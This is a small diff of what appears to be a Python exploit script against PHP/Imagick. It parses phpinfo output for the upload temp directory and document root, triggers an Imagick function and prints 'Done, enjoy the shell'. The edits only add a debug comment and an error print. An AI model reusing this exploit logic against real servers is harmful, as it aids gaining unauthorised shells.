@@ -38,8 +38,10 @@ def getTmpUploadDirAndDocumentRoot():
     pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
     pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
    
+    #match1 is empty
     match1 = re.search(pattern1, response.text, re.DOTALL)
     match2 = re.search(pattern2, response.text, re.DOTALL)
+
     return match1.group(1), match2.group(1)
 
 def trigerImagick(tmpDir):
@@ -81,6 +83,7 @@ if __name__ == "__main__":
         try:
             trigerImagick(tmpDir)
         except:
+            print('error')
             pass
 
         print("[-] Done, enjoy the shell")
